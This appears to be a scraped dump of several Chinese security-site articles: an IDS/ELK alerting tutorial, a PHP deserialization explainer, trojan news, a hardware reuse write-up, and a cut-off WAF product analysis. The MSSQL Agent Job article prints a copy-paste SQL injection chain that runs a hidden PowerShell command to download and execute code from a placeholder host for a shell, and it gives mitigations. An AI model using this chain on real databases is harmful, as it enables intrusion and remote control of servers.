“changeme”在服务启动后，通过Logstash对IDS的日志文件进行分析处理，并将数据打入es存储。 新建配置文件/etc/logstash/conf.d/test.conf，键入以下内容：input {  file {    path =&gt; ""/var/log/suricata/eve.json""    type =&gt; ""attack""  }}filter {  if [type] == ""attack"" {    json{      source =&gt; ""message""    }  }}output {  if [type] == ""attack""{    elasticsearch {      hosts =&gt; [""localhost:9200""]      user =&gt; elastic      password =&gt; changeme    }  }}随后启动Logstash服务：systemctl start logstash.serviceKibana便是我们的攻击溯源平台，打开Kibana的Web页面 http://localhost:5601可以看到我们的IDS日志已经被结构化的存储在其中，利用检索功能可以快捷且准确的定位到相关日志内容。 比如，可以直接输入“nmap”进行模糊搜索，也可以通过字段匹配语法进行精确匹配“dest_port:80 AND event_type:alert”以上通过 Suricata 和 ELK Stack 便快速搭建了一套简易但高效的入侵检测溯源系统，使用ELK的优势在于几乎不需要设置便能保证在非常大数据量下的查询速率。而日志的完整性取决于 Suricata 中 攻击识别规则的丰富性，通过官方提供的 snort 规则目前是可以识别常见的流量信息及攻击流量。3. 高定制化的实时告警包括很多商业IDS在内做的不好的便是实时告警这一块，有的通过Web页面提供告警，做得好一点则能配置邮件告警。但在我实际的使用中发现，告警策略其实更与系统使用者密切联系，而开发厂商很难能提供周密完善的配置选项，所以一个能高度定制化的告警系统是我们想要的。ElasticSearch 的 API 接口为我们提供了这种可能，其查询返回的 JSON 格式也非常便于我们进行查询数据的处理。官方提供的 X-PACK 扩展包中便包含了可以提供告警功能的 Watcher 扩展插件。这里简单介绍下Watcher的配置方法：PUT _xpack/watcher/watch/xxxx_name{  ""trigger"" : { ""schedule"" : { ""interval"" : ""10s"" }},  ""input"" : {},  ""condition"" : {""compare"" : { ""ctx.payload.hits.total"" : { ""gt"" : 0 }}},  ""actions"" : {}}指定一个告警任务，需要配置4个模块：Trigger、Input、Condition、ACTIONSTriggerTrigger控制如何触发一次查询，可以设置间隔时间每隔10s触发""trigger"" : {  ""schedule"" : { ""interval"" : ""10s"" } }也支持大家熟悉的cron格式每天9:05触发""trigger"" :{  ""schedule"" : {""cron"" : ""0 5 9 * * ?""}}InputInput 负责数据的来源，支持以下四个input类型simple: 读取静态内容search: 读取查询语句执行后的返回结果http: 读取HTTP请求的返回结果chain: 用来自由组合使用上面三种类型组成的多个input以search为例举个例子查询“logs”索引，匹配message字段为error的数据 ""input"" : {    ""search"" : {      ""request"" : {        ""indices"" : [ ""logs"" ],        ""body"" : {          ""query"" : {            ""match"" : { ""message"": ""error"" }          }        }      }    }  }Conditioncondition决定之后的ACTION是否执行当查询数量大于0时执行ACTION  ""input"" : {    ""search"" : {      ""request"" : {        ""indices"" : [ ""logs"" ],        ""body"" : {          ""query"" : {            ""match"" : { ""message"": ""error"" }          }        }      }    }  },  ""condition"" : {    ""compare"" : { ""ctx.payload.hits.total"" : { ""gt"" : 0 }}   }Action当条件符合后，ACTION决定执行的操作即信息内容及发送的对象。 支持email, webhook, index, logging, hipchat, Slack, 和 pagerduty发送POST到 xxx.com:123/path ，内容为json字串 {""a"":""b"",""total"":xxx}""actions"" : {  ""xxx_webhook_name"" : {     ""webhook"" : {      ""method"" : ""POST"",       ""host"" : ""xxx.com"",       ""port"" : 123,       ""path"": "":/path"",       ""body"" : ""{        \""a\"": \""b'\"",        \""total\"": \""{{ctx.payload.hits.total}}\""      }""    }  }}利用webhook可以向任意Web服务发送请求，这是我们想要的。通过这个接口非常便于与企业内的其他已有平台进行交互，或者可以通过如今流行的IM公众号。这里以蓝信为例，需要先请求获取一个token，然后发送JSON字串到API即可，其中JSON字串的内容为：了解了基础的Watcher配置方法和蓝信接口后，我们来制作告警任务。拟一个目标：在每天9、14、18点查询当日日志数量，日志类型的统计，来源IP统计。PUT _xpack/watcher/watch/attack_alert{    ""trigger"" :{""schedule"" : {""cron"" : ""0 0 9,14,18 * * ?""}},    ""input"": {        ""chain"": {            ""inputs"": [                ##发送HTTP请求到蓝信获取token                {                    ""first"": {                        ""http"" :{                            ""request"": {                                ""host"": ""lxopen.api.xxx.com"",""port"": 80,                                ""path"":  ""/ffff/token"",                                ""params"": {""grant_type"":""client_credential"",""appid"":""12345"",""secret"":""abcde""}                            }                        }                    }                                   },                ##进行查询得到目标结果                {                    ""all"": {                      ""search"": {                            ""request"": {                                ""indices"": ""&lt;logstash-{now/d}&gt;"",                                ""body"": {                                    ""query"": {                                         ""bool"": {                                            ""must"": {""match_all"": {}}                                        }                                    },                                    ""aggs"" : {                                        ""ip_list"" : {                                            ""terms"" : { ""field"" : ""src_ip.keyword"" }                                        },                                        ""type_list"" : {                                            ""terms"" : { ""field"" : ""event_type.keyword"" }                                        }                                    }                                }                            }                        }                    }                }            ]        }    },    ##只要数量大于0就执行ACTION    ""condition"" :{        ""compare"" : {""ctx.payload.all.hits.total"": {""gt"": 0}}    },     ""actions"": {        ""attack_alert"" : {            ""throttle_period"" : ""600s"", //每两次告警间的最小时间间隔            ""webhook"" : {                ""method"" : ""POST"",                ""headers"": {""Content-type"": ""application/json""},                ""host"" : ""lxopen.api.xxx.com"",                ""port"" : 80,                ""path"" :""/xxxx/message/send"",                 ""params"" : {""access_token"" : ""{{ctx.payload.first.access_token}}""}, //传入前面获取到的 token                #构造我们的文本消息                ""body"" : ""{\""toall\"": \""true\"",\""tousers\"": [\""180******0\""],\""msgtype\"": \""text\"",\""text\"": {\""content\"": \""=======Total {{ctx.payload.all.hits.total}}\\n{{#ctx.payload.all.aggregations.type_list.buckets}}{{key}} {{doc_count}}\\n{{/ctx.payload.all.aggregations.type_list.buckets}}\\n=======Src IP\\n{{#ctx.payload.all.aggregations.ip_list.buckets}}{{key}} {{doc_count}}\\n{{/ctx.payload.all.aggregations.ip_list.buckets}}\""}}""            }        }    }}创建成功后，蓝信客户端就可以每天定时收到当天的日志统计报告了。 只需要改下接口，也可以同时发送到其他如微信等平台上。第二个例子，来个干货。 针对敏感操作的日志记录。对于敏感或者储存重要数据的服务器，如果发生了入侵事件我们可以通过命令记录来查看黑客入侵的方式，但有经验的入侵者往往会删去这些记录。为了防止这一点，我们有必要对命令历史记录做一个增强，让它能较完整的记录命令相关信息（时间、命令、登录用户、当前用户等），同时能实时将日志回传到es。在/etc/bash.bashrc行末加入以下内容：HISTDIR='/var/log/command.log'if [ ! -f $HISTDIR ];then    touch $HISTDIRchmod 666 $HISTDIR    fi    export HISTTIMEFORMAT=""{\""TIME\"":\""%F %T\"",\""HOSTNAME\"":\""$HOSTNAME\"",\""LI\"":\""$(who -u am i 2&gt;/dev/null| awk '{print $NF}'|sed -e 's/[()]//g')\"",\""LU\"":\""$(who am i|awk '{print $1}')\"",\""NU\"":\""${USER}\"",\""CMD\"":\""""    export PROMPT_COMMAND='history 1|tail -1|sed ""s/^[ ]\+[0-9]\+  //""|sed ""s/$/\""}/""&gt;&gt; /var/log/command.log'执行 source /etc/bash.bashrc，就可以在/var/log/command.log看到日志 JSON类型的日志，通过logstash中配置日志回传：input {  ...  file {    path =&gt; ""/var/log/command.json""    type =&gt; ""cmd""  }  ...}filter {  ...  if [type] == ""cmd"" {    json{      source =&gt; ""message""    }  }  ...}output {  if [type] == ""attack"" or [type] == ""cmd""{    elasticsearch {      hosts =&gt; [""localhost:9200""]      user =&gt; elastic      password =&gt; changeme    }  }}这样ES就会实时收集主机的shell日志了。 最后完善下告警任务，在Input里加入： {    ""cmd"": {      ""search"": {            ""request"": {                ""indices"": ""&lt;logstash-{now/d}&gt;"",                ""types"" : ""cmd"",                ""body"": {                    ""query"": {                         ""bool"": {                            ""must"": {""match_all"": {}}                        }                    }                }            }        }    }}在告警内容里面添加：\\n=======CMD\\n{{#ctx.payload.cmd.hits.hits}}{{HOSTNAME}} {{LI}}:{{CMD}}\\n{{/ctx.payload.cmd.hits.hits}}效果预览像这样： 一旦服务器上有操作产生，我们便能立马得到通知，进行应急响应。最后对于告警，我想说的是一定要记得：满篇的告警是不会有人去看的。重点过多也就没有重点了，告警一定要精而不要多，只针对一些关键的异常告警往往能事半功倍。","2016-11-14 11:46:24","系统安全","企业级入侵检测系统及实时告警的开源实现","http://nsoad.com/Article/system/20161114/762.html"
"5ccbfb2a4f2f0a0a7a69c125","PHP存在着一个很有趣的漏洞，PHP对象注入，不过我们通常称为反序列化漏洞，虽然对于这个漏洞网上介绍的文章有很多，但是我感觉并没有达到通俗易懂，所以本篇文章将追求介绍最详细的php反序列化漏洞。力求小","root","前言PHP存在着一个很有趣的漏洞，PHP对象注入，不过我们通常称为反序列化漏洞，虽然对于这个漏洞网上介绍的文章有很多，但是我感觉并没有达到通俗易懂，所以本篇文章将追求介绍最详细的php反序列化漏洞。力求小白也能看懂。 基础知识再介绍漏洞之前我们先要来了解一下什么是反序列化，所有php里面的值，我们都可以使用函数serialize()来返回一个包含字节流的字符串来表示。见下图：序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。所以对象A和对象B序列化后并没有什么区别。大家是不是看不懂序列化后是什么意思啊。别急，让我来解释一下。s:16代表这个是字符串，字符串长度为16，a:2代表这个是数组，有两个数值。O代表对象，A和B是类名，a和b是类实例化后的对象名，i是数值类型。unserialize()函数能够重新把字符串变回php原来的值。 漏洞产生原因漏洞的根源在于unserialize()函数的参数可控。如果反序列化对象中存在魔术方法，而且魔术方法中的代码有能够被我们控制，漏洞就这样产生了，根据不同的代码可以导致各种攻击，如代码注入、SQL注入、目录遍历等等。 反序列化之代码注入我们先来看一段存在漏洞的代码。这里__destruct是当一个对象被销毁时被自动调用的析构方法。我们可以发现A类中存在魔术方法__destruct，然后unserialize中参数可控。这样我们就可以控制其中的变量a的值。漏洞就由此尝试了。 漏洞利用漏洞利用的思想，使我们模仿一个A类，然后给变量a赋值。我们来注入phpinfo()。首先使我们模仿一个A类，然后给变量a赋值，执行序列化操作。得到序列化后的字符串。将序列化后的字符串提交，注意加上我们注入得代码。注入成功 总结其实漏洞的核心思想还是在于unserialize函数，漏洞利用的核心思路在于控制魔术方法中的代码从而产生代码注入，SQL注入，目录遍历等一系列的漏洞利用。防御本漏洞就要严格控制unserialize函数的参数，对unserialize后的变量内容进行检查，确保绿色输入。","2016-10-11 15:17:47","Web安全","神奇的php反序列化","http://nsoad.com/Article/web/20161011/527.html"
"5ccbfb2a4f2f0a0a7a69c126","近期，专家发现一个Android Acecard木马的变种，这个变种也被认为是迄今以来最危险的一版 Acecard木马。一旦用户不小心下载了这个新版的Acecard木马，就会要求他们上传一张","silence","近期，专家发现一个Android Acecard木马的变种，这个变种也被认为是迄今以来最危险的一版 Acecard木马。一旦用户不小心下载了这个新版的Acecard木马，就会要求他们上传一张手持自己身份证明的自拍照。各类犯罪方式总是有永无止境的新“创意”来不断地带给我们“惊喜”。最近，一些公司开始使用一种基于自拍的新型身份验证方法。像是汇丰银行（HSBC）的客户就可以仅仅通过一张自拍来开户；Mastercard的在线支付已经可以通过自拍而不是密码来实现，采用类似方式的还有苏格兰银行等部分金融机构。并不出乎意料的是，很快就有黑客瞄上了这种生物识别的新方法。McAfee的专家就在最近发现了Android 银行木马Acecard的新版本，这个新的变种木马会伪装成视频应用或者为某特定视频使用的插件或解码器。McAfee的blog中写道，“最近McAfee移动实验室团队的专家发现，曾经为人熟知的Android银行木马Acecard出现了变种。不像一开始只是获取一些用户的财务信息，新版本的Acecard木马开始针对生物识别。注：Acecard还被称为Torec，由于木马利用Tor与控制服务器通信。”“除了请求用户的信用卡和二元认证的信息以外，这个恶意应用还会要求用户上传一张本人及身份证明的自拍。要知道，只要黑客获取了这些认证信息，不仅是用户的银行账户，连社交网络上的信息都会受到很大程度的威胁。”盗取用户信息的三个步骤这个假的视频插件会被伪装成Adobe Flash Player,色情应用,或视频编解码器隐藏在Android系统中。一旦Acecard木马被成功安装，会在询问用户之后取得一系列的设备权限来执行恶意代码，然后等待用户打开应用。当这个插件在后台运行的时候，Acecard木马就会特定监控一些与支付相关的应用。一旦用户打开其中之一，恶意软件就会在原有页面上叠加一个假的页面，来实现钓鱼攻击，假装谷歌商店需要你的信用卡细节和更多的个人财务信息，包括持卡人姓名、生日、电话号码、信用卡有效期和CCV码。McAfee的研究员Bruce Snell说道，“在用户打开应用之后，木马会将假的页面叠加在最上层，询问用户的信用卡细节。在验证信用卡卡号成功之后就会要求更多额外信息，像是卡背面的四位数字等。”在获取了用户的信用卡和个人信息之后，Acecard木马就会要求用户完成一个需要三个步骤的假的“身份验证”流程。前两个步骤，木马会要求用户上传一种能证明身份的证件（身份证、护照、驾照）正反两面清晰可视的照片。如下图所示：在最后一步，恶意软件会要求用户上传一张手持这个证件的自拍照。造成的危害Acecard木马的使用者可以利用这些收集到的信息进行很多违法行为，甚至会导致用户身份盗窃。要知道，这些信息已经足够非法实现在线转账，盗取用户的社交媒体账户。这个木马玩的把戏已经不新鲜了，任何对技术有一点点概念的都应该知道这是一种恶意行为，谷歌是不可能索要用户的身份证明的。但是对一些丝毫不懂技术的人来说，这种方式依然百试不爽。McAfee专家还说，Acecard木马目前已经感染了新加坡和香港的部分用户。当然，如果想要知道有什么能避免这种攻击手法：一方面不要随便下载不受信任的应用，在下载前仔细审查这个App的权限要求；另一方面，切记不要拿着你的证件自拍。重要提示：除了个别移动银行服务，没有其他应用会需要你拿着自己的证件自拍。所以，在上传这样的照片之前一定要三思。","2016-10-20 14:57:40","网络安全","这款安卓木马会问你要张自拍","http://nsoad.com/Article/Network-security/20161020/611.html"
"5ccbfb2a4f2f0a0a7a69c127","仓库有一台很久不用的启明星辰天阗N100入侵检测设备，百度了下是02年的产品，据说03年左右买的，当时价格不菲，不过买来也没怎么起作用，连网络都没连上过几次，前些日子机","kong","仓库有一台很久不用的启明星辰天阗N100入侵检测设备，百度了下是02年的产品，据说03年左右买的，当时价格不菲，不过买来也没怎么起作用，连网络都没连上过几次，前些日子机房装修，从机柜上拆下来，我拆开盖子看了看是x86架构的产品，Socket370的CPU（奔三），32M的DOM电子盘，512MSDR内存，配置早就过时，觉得没什么用，就扔旧件仓库了。    这两天PA群发公告说响应环保部号召旧物利用，把淘汰的X86网络设备拿出来改造成流控设备，遂想起这货在仓库的阴暗角落里吸灰，就去翻腾出来瞧瞧。  开盖&amp;背面：  EM-561主板made in taiwan  从上面的图可见这主板有三个网卡接口，2个ide接口，电子盘是ide接口的，机箱内还预留了一个3.5寸硬盘位。（背板上的另一个rj45 consle接口是从主板的com口接出来的，不能作网卡用）硬件方面，三网口，符合流控软件最低要求，32M盘太小，换成ide硬盘（是个硬盘就够用），1G主频的处理器用户数不多也够用了不过问题来了，没有常见的vga接口和ps2键盘输入接口，无法进行基本安装和设置。继续百度，发现网上关于em-561主板的资料很少，好在有一篇贴文有所帮助，找到了主板的部件说明，见下图（接线方法跟实际有出入）：  主板细节图：  根据这个图，再仔细观察主板，发现VGA针脚跟ide接口针脚近似，于是找出淘汰的PC机，拆出其中的40线IDE线缆，然后下手：  取12针，掰出12条线。（上图我把线拽下来了，后来又按上去的，ide接口压线跟rj45墙插压线近似，然后用热熔胶粘上免得再拽下）再截断一条vga线，跟12条ide小线接在一起，正确接法如下：  ok，接上后是这个样子的：  插到主板的VGA插座，别反了，先换好cmos电池不然都点不亮（旧的拔下用万用表测，只有0.2V了），开机，有画面了，使用天阗入侵检测系统的32M电子盘启动后是这样的，出现画面后那个激动人心啊（主要是这vga线太难接了）：  场面太乱，请适当忽视，可见天阗N100是红帽6.1的系统，kernel 2.4.18然后我的ps2接口就费老劲了，怎么弄也弄不好，自己测了很多次线，就是不行，com口转ps2我也试了，还是识别不了键盘。。。。。。搞了ps2口N小时以后，发现usb口可以试一下，于是拆下旧pc上的前置usb模块，经试验接法如下：  插上usb键盘，启动，num灯亮了一下，oh my god，竟然是支持usb键盘的！能进bios了！  01年的bios，02年的硬件，竟然是支持usb键盘的，其实也支持u盘启动，试验过支持得不太好，所以略了，还是用比较传统的光驱启动吧激动啊，这货终于能报告它在干啥，也能听我命令让干啥干啥了接好usb键盘、光驱、硬盘的样子：  然后就是大家都知道的了。。。。。ide1插上硬盘，ide2插上光驱，开机，bios设置从cdrom启动，保存退出把刻好的panabit live cd放入光驱，启动，进入了熟悉的panabit（基于freeBSD系统）启动画面：  首次安装，一路Y，直到让你选择管理网口（注意：下图的掩码处不要学我写24，而要写全255.255.255.0此类，后来我ee /usr/panaetc/ifadmin.conf改的）：  三个口，我选第一个做管理口，其他两个被自动配置成数据口了打完收工，到此，旧物利用的x86架构网络设备改造为panabit流控就算安装完毕了，然后就是弹出安装光盘、关机、拔掉光驱和vga、usb之类的收尾工作。装好上架：  背面：  不用闪光才能拍到led亮，可见有数据从桥上通过fxp0是配置了内网ip地址的管理口，fxp1和fxp2做网桥无地址，fxp1接内网，fxp2接外网，通过配置策略，可以控制从网桥上通过的数据流，比如网内单ip限速，限制p2p下载上传、在线视频，控制网内私接路由和随身wifi热点等等。  注意别跟实际弄反了，反了可以在管理页面重新设置一下。拓扑：","2016-11-18 15:33:06","系统安全","旧物利用，02年入侵检测设备变身内网流控利器","http://nsoad.com/Article/system/20161118/806.html"
"5ccbfb2a4f2f0a0a7a69c128","因为MSSQL 2005以后的版本默认禁止了XP_CMDSHELL，如果服务器开启了MSSQL Agent Job服务，并且有权限新建和执行agent jobs的话，配合cobaltstrike的powershell payload会返回一个SQLSERVERAGENT权限的shel","silence","安全客技术点评因为MSSQL 2005以后的版本默认禁止了XP_CMDSHELL，如果服务器开启了MSSQL Agent Job服务，并且有权限新建和执行agent jobs的话，配合cobaltstrike的powershell payload会返回一个SQLSERVERAGENT权限的shell。操作的具体步骤可以参考视频，实际操作的时候需注意URL编码问题。 写在前面的话Optiv渗透测试（A&amp;P）团队的主要目标就是通过模拟恶意黑客的攻击行为来测试公司的安全防御的有效性。所谓安全测试，就是要通过模拟真实的攻击场景对企业或组织的安全解决方案进行多方面的评估。这种类型的安全评估不仅可以帮助组织确定自己的信息安全防护能力，还可以帮助他们提升系统的安全性。除此之外，安全研究人员还可以在测试过程中找出那些安全意识薄弱的雇员，企业就可以对这部分人进行额外的安全培训，以尽可能地避免因不安全的人为操作而导致的安全事件发生。实际上在信息安全领域中，攻击者和防御者一直都在玩着一种“猫捉老鼠”的游戏，而且信息安全攻防也是一场永无止境的“军备竞赛”。恶意攻击者会使用新型的攻击手段来发动攻击，而安全专家又需要针对这些攻击方法来设计并部署相应的检测和防御措施。因此，从安全防御的角度出发，企业或组织应该以一种积极主动的态度来与网络恶势力对抗。各个组织应当要能够识别新型的攻击，并且提前采取适当的措施来抵御这些攻击，这就是我们所说的“先发制人”。长期以来，Optiv公司的A&amp;P团队无论在攻击端还是防御端都一直保持着自己的技术专业性，而且Optiv公司提供给用户的安全防御方法可以有效地检测并防御新型的网络攻击。如果组织想要在这个不断变化的安全威胁环境中生存下来，那么就必须要有一个专业的安全团队来帮助他们评估攻击者可能会采用的攻击策略、攻击技术、以及攻击过程（TTP），并且在安全团队的帮助下，利用这些评估数据来提升自己的安全性。在这种情况下，Optiv公司也许是一个最合适的选择。 未被发现的攻击现在，很多攻击者在发动恶意攻击的时候已经不会单纯地去追求成功率了，因为他们还需要保证自己的攻击活动不被检测到。如果企业在检测和发现数据泄漏的过程中耗费的时间越久，那么攻击者就会有更多的时间去识别并提取系统中的敏感数据。不仅如此，攻击者甚至还可以利用这个被入侵的网络系统来作为一个支点，并进行其他的恶意攻击活动。Optiv公司的A&amp;P团队会设计并实施一些高级的网络攻击，而我们的目标就是通过这些攻击来发现防御端与攻击端之间的差距，并帮助组织提升安全防护能力。 微软的SQL Server Agent近期，Optiv公司的安全研究专家发现了一种新型的攻击手段。如果MSSQL数据库中开启了MSSQL Server Agent Job服务的话，攻击者将可以利用MSSQL Server中自带的功能来获取一个shell。MSSQL Server代理是一个Windows服务，它可以被用来执行自动化任务。管理员可以设置定时代理作业，然后在MSSQL Server代理服务中执行这些定时作业。但是，如果使用了代理的话，这些作业（job）就可以使用不同的证书来执行了。 攻击浅析在近期的一次安全分析中，研究人员在一个使用了MSSQL Server 2012的Web应用中发现了一个SQL注入漏洞。在客户的要求下，Optiv以一种非公开的方式对目标进行了安全评估，并且在评估的过程中尽可能地避免被检测到。Optiv设计出了一种新的攻击方法，研究人员可以利用MSSQL Server中的本地功能来在Windows操作系统中执行任意命令。在整个测试过程中，xp_cmdshell存储过程已被禁用了，并且限制了创建自定义存储过程的能力。当xp_cmdshell扩展存储过程在攻击中被使用时，大多数安全监控或检测系统都会产生警报。而攻击者和渗透测试人员对xp_cmdshell的滥用已经导致很多组织和企业开始禁用或限制xp_cmdshell了。Optiv发现了一种攻击场景，攻击者或可利用MSSQL Server代理来在目标数据库服务器中执行任意控制命令。但是，目标服务器必须满足一下几个条件：1. 目标服务器必须开启了MSSQL Server代理服务；2. 服务器中当前运行的用户账号必须拥有足够的权限去创建并执行代理作业；Optiv已经发现了两个攻击者可以利用的MSSQL代理作业子系统：CmdExec和PowerShell子系统，这两个功能可以分别用来执行操作系统命令和PowerShell脚本。Optiv的安全研究专家可以使用SQL注入点来创建并执行代理任务。任务所需执行的命令是一段PowerShell代码，这段代码可以让目标系统与一个受Optiv控制的IP地址进行通信连接，然后下载额外的PowerShell指令。这样一来，就可以在目标数据库服务器与Optiv控制的服务器之间建立一条可交互的命令控制会话了。下面这张代码截图显示的是已被拆分的SQL语句。请注意，在下面这段下载命令中，URI位于两个单引号之间，而不是之前的双引号。这样做是为了在SQL语句中转义单引号。 USE msdb; EXEC dbo.sp_add_job @job_name = N'test_powershell_job1' ; EXEC sp_add_jobstep @job_name = N'test_powershell_job1', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring(''http://IP_OR_HOSTNAME/file''))""', @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job1'; EXEC dbo.sp_start_job N'test_powershell_job1';如果你想要复现攻击场景的话，上面这段代码可以方便你进行复制粘贴。接下来，我们将通过下面的例子来给大家进行攻击演示。 攻击示例如下图所示，SQL语句已经进行了URL编码处理。在这个攻击示例中，攻击是通过HTTP GET请求来发送的，因此我们需要对攻击payload进行URL编码。大家可以看到，我们在HTTP GET请求的参数中添加了SQL注入payload，这样我们就可以使用SQL注入了。（请注意我们在payload的开头处添加的%20（空格符））当payload运行之后，我们就可以看到命令控制会话已经建立成功了，并且使用的是“SQLSERVERAGENT”账号的权限。在目标主机的SQL Server中，我们可以看到SQL代理作业已经创建成功了。我们在这里给大家提供了一个完整的攻击演示视频：  攻击过后的安全剖析如果目标主机运行了MSSQL代理服务，并且代理服务使用的用户账号可以访问其他的MSSQL Server的话，那么攻击者就可以利用这种攻击来在其他的MSSQL Server中执行MSSQL Server代理作业了。除此之外，攻击者还可以设置定时代理作业，这也就意味着，攻击者不仅可以利用这种方式来躲避安全检测，而且还可以实现对目标MSSQL Server的持久化控制。在某些情况下，如果MSSQL Server代理服务使用的是权限更高的用户账号，那么攻击者就可以通过这种攻击来实现提权。攻击缓解方案常用的Web应用安全保护策略应该都可以防止这种类似SQL注入的攻击。用户应该在Web应用中使用事先定义好的SQL查询语句，然后从后台数据库中提取出Web应用的事务处理逻辑。除此之外，用户也应该部署Web应用防火墙来检测并阻止这种攻击。如果内部系统无需直接访问互联网主机的话，用户应该直接阻止这类操作，这样就可以防止攻击者在组织内部服务器与外部恶意服务器之间建立通信连接了。除此之外，管理员也应该部署严格的数据输出过滤策略。由于攻击者可以利用MSSQL Server代理作业来在其他的数据库服务器中执行SQL查询操作，那么为了限制这种攻击，我们就要严格控制数据库用户账号的权限，即按照“最小权限原则”来分配账号权限。","2016-09-28 20:03:18","Web安全","【技术分享】MSSQL注入时通过Agent Job执行命令的方法","http://nsoad.com/Article/web/20160928/461.html"
"5ccbfb344f2f0a0a7a69c129","WAF（Web Application Firewall）对于搞web渗透测试的甲方安全运维工程师、众测平台的白帽子、乙方web渗透工程师、搞黑产的blackhat是个并不陌生的web安全防护手段。在工作中或多或少涉及到这方面的相关知","blackhold","0×00、前言WAF（Web Application Firewall）对于搞web渗透测试的甲方安全运维工程师、众测平台的白帽子、乙方web渗透工程师、搞黑产的blackhat是个并不陌生的web安全防护手段。在工作中或多或少涉及到这方面的相关知识，那么，从产品的角度上对WAF做竞品分析十分有必要，可以帮助用户更好的理解WAF产品功能，同时，也为WAF厂商指明了研发方向。以下站在安全产品经理的角度上，做的WAF竞品分析，包含：行业现状分析、产品功能分析、交互设计分析、运营及推广策略（偏重PR）。0×01、行业现状分析通过行业现状分析，我们可以更好的把握住市场趋势，研究WAF细分领域市场。分析的目标用户，来源于Top 24家互联网金融网站(融资规模大小)，原因是，WAF是这部分企业级客户在安全方面的刚性需求。1.1、调研问卷题目：（1）IT架构：公有云、IDC机房、自建机房。（2）调查WAF部署形式：透明代理硬件形式、云WAF、反向代理集群形式、基于主机Agent部署、开源系统自建。（3）目前你使用WAF的困惑：云WAF数据隐私保护问题、安装在主机上WAF应用程序性能是否影响正常业务、开源自建WAF规则维护成本高。如果大家有时间，可以帮忙填写一下问卷调查，http://wj.qq.com/s/753888/308e1.2、调研技术手段：无论从技术上，还是商业上都是很难获取到ToB产品的企业数量，所以，从技术角度上讲，通过互联网抓取我们想要的数据，自己统计分析。WAF类型    重点关注厂商硬件WAF                     nsfocus、imperva                 云WAF                     百度安全宝、阿里云盾                 基于主机Agent WAF                     安全狗                 开源WAF                     modsecurity                 反向代理集群WAF                     由于这块市场目前还没有很牛逼的产品，所以暂时空白。                 1.3、调研技术原理：如何确认其WAF特征，我参考了 wafw00f、nmap、sqlmap有关识别WAF的脚本，编辑一个批量扫描的脚本。首先检查是否存在WAF，通过提交xss脚本，查看网站页面特征，如果返回页面异常，证明存在WAF。然后通过脚本判断对应的WAF类型，由于WAF特征也会被人为更改，所以，只能粗略评估部署率。1.4、结果输出：（1）WAF部署类型产品占有率（2）WAF产品市场占有率备注：详细的原始数据，可以联系文章作者获取。1.5、结论：当时看到这样的结论，我也很意外，不过可以看出以下趋势：（1）重要的互联网金融网站一般不会开WAF阻断模式，除非购买公有云WAF产品。（2）云WAF在互联网金融业务使用率蛮高。（3）自建WAF也是互联网金融企业安全团队热衷去做的一件事情。（4）商业集群WAF软件在崛起，它的直接竞争对手是自建WAF。（5）只有有钱的主才会买硬件WAF，否则它将退出历史舞台。（6）很少有企业在商业环境下使用类似**狗这样的免费WAF，不付费就代表着售后没有保证。0×02、产品功能分析 2.1、产品功能对照表由于手上资源有限，本章节只分析imperva、nsfocus WAF、天融信WAF产品功能。         imperva    nsfocus    天融信网络层防护    应用代理防火墙                 网络层特征码（IPS）                封禁IP管理                网络防护-SYN Flood                网络防护-ACK Flood                网络防护-HTTP Flood                网络防护-慢速攻击                网络防护-ADS（抗D硬件）联动                     抗 DDoS                网络防护-SYN Flood                网络防护-ACK Flood                网络防护-HTTP Flood                网络防护-慢速攻击                网络防护-http/s CC攻击WAF基本功能    反爬虫                 Bot Mitigation                 Web 特征                  Web 蠕虫                  Web 应用程序特征码                  Web 应用程序自定义                  OCSP 协议验证                     规则库管理-web服务器漏洞                规则库管理-web插件漏洞                规则库管理-爬虫防护                规则库管理-跨站脚本防护                规则库管理-SQL注入防护                规则库管理-LDAP注入防护                规则库管理-SSI指令防护                规则库管理-XPATH注入防护                规则库管理-命令注入防护                规则库管理-路径穿越防护                规则库管理-远程文件包含防护                规则库管理-内容过滤                规则库管理-webshell防护                规则库管理-敏感信息防护                规则库管理-盗链防护                规则库管理-扫描防护                     规则库-访问控制（URL白名单）                协议合规                文件上传                规则库管理-SQL注入防护                规则库管理-XSS注入防护                规则库管理-目录遍历                规则库管理-LDAP注入防护                规则库管理-SSI指令防护                规则库管理-网页扫描防护                规则库管理-XPATH注入防护                规则库管理-info leak防护                规则库管理-命令注入防护                规则库管理-RFI防护                规则库管理-web服务器漏洞防护                规则库管理-盗链防护                规则库管理-爬虫防护                规则库管理-CSRF策略                 WAF特有功能    动态特征构建                通用用户跟踪 (UUT)                 关联攻击检测（Web&amp;DB）                     自学习功能    自学习功能                 威胁情报    ADC 威胁情报联动                ThreatRadar – ATO                 Device IDs Black List                 ThreatRadar – ATO Device IDs White List                 ThreatRadar – Anonymous Proxies                 ThreatRadar – Anonymous Proxies White List                ThreatRadar – Comment Spam IPs                 ThreatRadar – Comment Spam IPs White List                ThreatRadar – Malicious IPs                 ThreatRadar – Malicious IPs White List                 ThreatRadar – Phishing URLs                 ThreatRadar – Phishing URLs White List                 ThreatRadar – Privileged User                 ThreatRadar – SQL Injection IPs                 ThreatRadar – SQL Injection IPs White                 List                ThreatRadar – Scanner IPs                 ThreatRadar – Scanner IPs White List                 ThreatRadar – TOR IPs                 ThreatRadar – TOR IPs White List                 ThreatRadar – Trusted Bots                     无    无外部模块联动    风险管理-web服务扫描                风险管理-数据库服务扫描                     智能补丁-SAAS云扫描（云端漏洞扫描联动）                智能补丁-WVSS扫描（本地漏洞扫描联动）                应用交付-通用防篡改                     网页防篡改                Web漏洞扫描从功能上看，上述3款产品都是基于正则表达式方式对Web威胁进行防护，针对未知web威胁防护，国内产品还是主要靠升级规则库的方式，国外主要靠威胁情报方式。但是目前基于正则表达式规则库的WAF产品很容易被绕过，建议使用新技术解决其问题。当然国内外厂商也在这方面做的很多工作，比如说imperva 动态特征创建，国内厂商的自学习功能。从功能测试看，国外动态特征创建要比国内的自学习功能强，因为国内的自学习主要是规定一段时间学习url提交的参数（string&amp;number）但是imperva是一直在自学习，然后快速建立攻击模型。2.2、WAF产品架构分析以上三款产品都是以硬件形式部署到用户环境当中，随着公有云平台逐渐被用户接受，本次分析主要聚焦在软件集群形式的WAF架构和硬件WAF技术分析。     软件集群形式WAF    硬件WAF针对网络层防护                （1）代理防火墙模块                